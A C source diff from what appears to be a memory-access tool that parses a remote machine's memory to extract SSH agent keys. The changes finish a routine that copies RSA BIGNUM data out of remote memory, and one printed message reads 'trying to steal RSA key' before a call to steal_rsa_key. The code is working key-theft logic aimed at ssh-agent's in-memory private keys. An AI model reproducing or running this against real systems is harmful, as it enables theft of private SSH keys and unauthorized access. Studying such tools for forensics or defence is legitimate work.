@@ -187,6 +187,7 @@ BIGNUM* fix_bignum(linear_handle lin, BIGNUM* rb)
 {
 	addr_t p;
 	BIGNUM* b;
+	int i;
 
 	printf("\t\t\t\tfix bignum @0x%08x: ", (uint32_t)rb);
 	p = (uint32_t)rb;
@@ -200,9 +201,8 @@ BIGNUM* fix_bignum(linear_handle lin, BIGNUM* rb)
 	   || linear_read(lin, p+16, &(b->flags), 4) ) {
 		free(b);
 		printf("failed to read BIGNUM @0x%08llx\n", p);
-		return 0;
+		return NULL;
 	}
-
 #ifdef __BIG_ENDIAN__
 	b->d = (BN_ULONG*) endian_swap32((uint32_t)b->d);
 	b->top = endian_swap32(b->top);
@@ -211,7 +211,21 @@ BIGNUM* fix_bignum(linear_handle lin, BIGNUM* rb)
 	b->flags = endian_swap32(b->flags);
 #endif
 
-	// TODO: fix b->d
+	// load b->d
+	p = ((uint32_t)b->d);
+	p &= 0xffffffff;
+	b->d = calloc(4, b->dmax);
+	if(linear_read(lin, p, b->d, 4*b->dmax)) {
+		free(b->d);
+		free(b);
+		printf("failed to read BIGNUM data block @0x%08llx\n", p);
+		return NULL;
+	}
+#ifdef __BIG_ENDIAN__
+	for(i=0; i<b->dmax; i++) {
+		b->d[i] = endian_swap32(b->d[i]);
+	}
+#endif
 
 	printf("recovered to 0x%08x\n", (uint32_t)b);
 	return b;
@@ -422,6 +436,7 @@ void check_ssh_agent(linear_handle lin) {
 					printf("\t\tkey will live for %u seconds\n", (uint32_t)death - (uint32_t)t);
 
 			rkey = 0;
+			// locate the key struct
 			// carefull: sizeof(rkey) is 8!
 			if(linear_read(lin, ridentity, &n, 4))
 				break;
@@ -432,6 +447,7 @@ void check_ssh_agent(linear_handle lin) {
 			rkey &= 0xffffffff;
 			printf("\t\tkey is at remote 0x%08x.\n", (uint32_t)rkey);
 
+			// load the key struct
 			if( linear_read(lin, rkey,    &key.type, 4)  ||
 			    linear_read(lin, rkey+4,  &key.flags, 4) ||
 			    linear_read(lin, rkey+8,  &key.rsa, 4)   ||
@@ -444,6 +460,7 @@ void check_ssh_agent(linear_handle lin) {
 			key.dsa = (DSA*)endian_swap32((uint32_t)key.dsa);
 #endif
 			printf("\t\tKEY: type:%d flags:0x%x, RSA* 0x%08x, DSA* 0x%08x\n", key.type, key.flags, (uint32_t)key.rsa, (uint32_t)key.dsa);
+			// check all keytypes
 			if(key.rsa) {
 				printf("\t\t" "\x1b[1;32m" "trying to steal RSA key at remote 0x%08x" "\x1b[0m" "\n", (uint32_t)key.rsa);
 				if(!steal_rsa_key(lin, &key)) {
